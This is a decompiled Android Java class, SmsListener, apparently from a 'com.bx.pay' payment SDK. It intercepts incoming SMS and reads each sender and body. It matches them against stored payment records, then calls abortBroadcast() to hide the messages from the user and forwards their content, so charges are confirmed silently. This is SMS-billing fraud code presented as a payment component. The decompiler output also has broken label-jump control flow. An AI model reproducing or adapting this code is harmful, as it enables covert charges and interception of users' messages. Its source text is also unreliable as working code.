package com.bx.pay;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;
import android.widget.Toast;
import com.bx.pay.a.c;
import com.bx.pay.a.d;
import com.bx.pay.a.f;
import com.bx.pay.a.g;
import com.bx.pay.utils.i;
import com.bx.pay.utils.n;
import java.util.Date;

public class SmsListener
  extends BroadcastReceiver
{
  private String a = SmsListener.class.getName();
  private SharedPreferences b = null;
  
  public SmsListener() {}
  
  public void onReceive(Context paramContext, Intent paramIntent)
  {
    int j = 0;
    Log.v(this.a, ">>>>>>>onReceive start");
    if (d.a) {
      Toast.makeText(c.a, "当前你付费要进行验证码确认，为了您方便使用，我们支付系统帮您完成这个步骤。", 0).show();
    }
    if (!WpaySmsService.isServiceRunning(paramContext, "com.bx.pay.WpaySmsService")) {
      a.b(c.a);
    }
    Object localObject2 = new StringBuilder();
    Object localObject1 = new StringBuilder();
    paramContext = paramIntent.getExtras();
    int i;
    label114:
    String str;
    if (paramContext != null)
    {
      paramContext = (Object[])paramContext.get("pdus");
      if (paramContext == null) {
        return;
      }
      paramIntent = new SmsMessage[paramContext.length];
      i = 0;
      if (i < paramContext.length) {
        break label405;
      }
      paramContext = Long.valueOf(0L);
      int k = paramIntent.length;
      i = j;
      if (i < k) {
        break label424;
      }
      str = ((StringBuilder)localObject2).toString();
      localObject1 = ((StringBuilder)localObject1).toString();
      if (!((String)localObject1).contains("+86")) {
        break label472;
      }
      paramIntent = ((String)localObject1).substring(3);
    }
    for (;;)
    {
      f localF = i.b();
      g localG = i.c();
      if (this.b == null) {
        this.b = i.a();
      }
      Long localLong = Long.valueOf(this.b.getLong("latest.payTime", 0L));
      this.b.getString("latest.payType", "");
      this.b.getString("latest.logCode", "");
      if (localF != null)
      {
        localObject1 = paramContext;
        if (paramContext.longValue() == 0L) {
          localObject1 = Long.valueOf(new Date().getTime());
        }
        if (j.a(paramIntent, str, (Long)localObject1, localF, localG))
        {
          localObject2 = Long.valueOf(0L);
          paramContext = (Context)localObject2;
          if (!n.a(localF.d()))
          {
            paramContext = (Context)localObject2;
            if (n.a(localF.d())) {
              paramContext = Long.valueOf(1000L * (60L * Long.valueOf(localF.d()).longValue()));
            }
          }
          long l1 = localLong.longValue();
          long l2 = paramContext.longValue();
          if ((((Long)localObject1).longValue() >= localLong.longValue()) && (((Long)localObject1).longValue() <= Long.valueOf(l1 + l2).longValue()))
          {
            abortBroadcast();
            if (localG != null) {
              j.a(paramIntent, str, (Long)localObject1, c.a, localG);
            }
          }
        }
      }
      Log.v(this.a, ">>>>>>>onReceive end");
      return;
      label405:
      paramIntent[i] = SmsMessage.createFromPdu((byte[])paramContext[i]);
      i += 1;
      break;
      label424:
      str = paramIntent[i];
      if (str != null)
      {
        paramContext = Long.valueOf(str.getTimestampMillis());
        ((StringBuilder)localObject2).append(str.getDisplayMessageBody());
        ((StringBuilder)localObject1).append(str.getDisplayOriginatingAddress());
      }
      i += 1;
      break label114;
      label472:
      paramIntent = (Intent)localObject1;
      if (((String)localObject1).startsWith("86")) {
        paramIntent = ((String)localObject1).substring(2);
      }
    }
  }
}
